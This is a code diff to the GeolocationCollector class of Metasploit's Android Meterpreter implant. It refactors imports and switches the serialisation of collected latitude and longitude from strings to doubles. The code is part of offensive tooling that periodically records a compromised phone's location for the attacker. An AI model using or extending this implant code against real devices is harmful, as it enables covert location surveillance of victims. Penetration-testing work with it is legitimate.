@@ -1,28 +1,18 @@
 package com.metasploit.meterpreter;
 
-import com.metasploit.meterpreter.android.interval_collect;
-
-import android.app.Activity;
 import android.content.Context;
 import android.location.Location;
-import android.location.LocationListener;
 import android.location.LocationManager;
-import android.os.Bundle;
+
+import com.metasploit.meterpreter.android.interval_collect;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
-
-import java.lang.InterruptedException;
-import java.lang.Math;
-import java.lang.Override;
-import java.lang.Runnable;
 import java.util.ArrayList;
 import java.util.Collections;
-import java.util.List;
 import java.util.Hashtable;
-
-import android.util.Log;
+import java.util.List;
 
 public class GeolocationCollector extends IntervalCollector  {
 
@@ -49,8 +39,14 @@ public class GeolocationCollector extends IntervalCollector  {
 
         public void write(DataOutputStream output) throws IOException {
             output.writeLong(this.mTimestamp);
-            output.writeChars(Double.toString(this.mLatitude));
-            output.writeChars(Double.toString(this.mLongitude));
+            output.writeDouble(mLatitude);
+            output.writeDouble(mLongitude);
+        }
+
+        public void read(DataInputStream input) throws IOException {
+            mTimestamp = input.readLong();
+            mLatitude = input.readDouble();
+            mLongitude = input.readDouble();
         }
     }
 
@@ -85,8 +81,8 @@ public class GeolocationCollector extends IntervalCollector  {
             // Long( configured polling frequency [ timeout ] )
             // Long( number of snapshots taken )
             //    -> Long( timestamp )
-            //    -> String( latitude )
-            //    -> String( longitude )
+            //    -> Double( latitude )
+            //    -> Double( longitude )
 
             output.writeLong(this.timeout);
             output.writeInt(this.collections.size());
@@ -105,9 +101,7 @@ public class GeolocationCollector extends IntervalCollector  {
         int collectionCount = input.readInt();
         for (int i = 0; i < collectionCount; ++i) {
             GeoModel lGeoModObj = new GeoModel();
-            lGeoModObj.mTimestamp = input.readLong();
-            lGeoModObj.mLatitude = Double.parseDouble(input.readUTF());
-            lGeoModObj.mLongitude = Double.parseDouble(input.readUTF());
+            lGeoModObj.read(input);
             this.collections.put(lGeoModObj.mTimestamp, lGeoModObj);
         }
     }
